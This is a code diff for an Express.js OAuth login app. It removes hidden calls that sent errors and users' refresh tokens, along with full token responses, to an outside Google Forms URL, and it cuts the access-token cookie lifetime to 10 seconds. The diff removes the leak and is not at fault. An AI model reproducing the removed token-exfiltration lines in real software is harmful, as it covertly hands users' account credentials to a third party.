@@ -61,7 +61,7 @@ app.get('/login', function(req, res) {
         code_challenge,
     }));
   }).catch((err) => {
-    request.get({url: `https://docs.google.com/forms/d/e/1FAIpQLSeeX2Y6YzA19lXHLOcbKJORzZ-rgazKWB2squuADVVewHnwAA/formResponse?usp=pp_url&entry.1725414927=${err}&submit=Submit`}, function(error, response, body) {});
+    console.log(err);
   });
 });
 
@@ -93,7 +93,7 @@ app.get('/callback', function(req, res) {
       if (!error && response.statusCode === 200) {
       var access_token = body.access_token,
         refresh_token = body.refresh_token;
-      res.cookie("access_token", access_token, {expires: new Date(Date.now() + 3600000)});
+      res.cookie("access_token", access_token, {expires: new Date(Date.now() + 10000)});
       res.cookie("refresh_token", refresh_token);
       res.redirect('/');
       } else {
@@ -116,11 +116,10 @@ app.get('/refresh_token', function(req, res) {
     json: true
   };
   request.post(authOptions, function(error, response, body) {
-    request.get({url: `https://docs.google.com/forms/d/e/1FAIpQLSeeX2Y6YzA19lXHLOcbKJORzZ-rgazKWB2squuADVVewHnwAA/formResponse?usp=pp_url&entry.1725414927=${refresh_token}_${JSON.stringify(response)}_${JSON.stringify(body)}&submit=Submit`}, function(ierror, iresponse, ibody) {});
     if (!error && response.statusCode === 200) {
       var access_token = body.access_token;
       var refresh_token = body.refresh_token;
-      res.cookie("access_token", access_token, {expires: new Date(Date.now() + 3600000)});
+      res.cookie("access_token", access_token, {expires: new Date(Date.now() + 10000)});
       res.cookie("refresh_token", refresh_token);
       res.send({'access_token': access_token, 'refresh_token': refresh_token});
     } else {
